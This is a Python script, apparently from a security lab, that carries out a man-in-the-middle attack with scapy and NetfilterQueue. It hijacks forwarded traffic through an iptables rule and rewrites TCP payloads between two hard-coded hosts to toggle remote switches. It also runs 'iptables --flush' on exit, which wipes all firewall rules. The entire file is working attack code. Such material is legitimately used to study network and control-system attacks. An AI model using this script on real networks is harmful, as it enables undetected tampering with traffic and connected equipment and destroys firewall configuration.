# Credit: Detailed explanation for MITM attack by converting to hex is available in
# https://github.com/johnnymythology/Man-In-The-Middle-Packet-Manipulation.git

import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import codecs


def process_packet(packet):

    scapy_packet = IP(packet.get_payload())
    pkt = packet.get_payload()
    #convert packet payload to hex
    pktHex = pkt.hex()

    #filter the packet based on source and destination ip
    if TCP in scapy_packet and scapy_packet[IP].src == "192.168.48.155" and scapy_packet[IP].dst == "192.168.48.238":
        print("old packet data:")
        print (scapy_packet[TCP].payload)

        pktDefault = pktHex[:104]

        pktData = pktHex[104:]
        # modify the data to toggle between the 1st and 2nd switches
        pdata= bytes.fromhex(pktData)
        if pdata == b'1':
            newData = newData = '2'.encode('utf-8')
        else:
            newData = '1'.encode('utf-8')
        newData = newData.hex()
        pktNew = pktDefault + newData

        #convert from hex to bytes
        pktBack = bytes.fromhex(pktNew)
        print ("packet back: ")
        print (pktBack)
        pktBack = IP(pktBack)
        del pktBack[IP].len
        del pktBack[IP].chksum   #After deleting scapy will automatically recalculate the IP and TCP Checksum
        del pktBack[TCP].chksum
        packet.set_payload(bytes(pktBack)) #Set the payload and send the packet
        print ("payload sent")


    # accept the packet
    packet.accept()


QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()
try:
  # bind the queue to callback `process_packet`
  queue.bind(QUEUE_NUM, process_packet)
  queue.run()
except KeyboardInterrupt:
  os.system("iptables --flush")
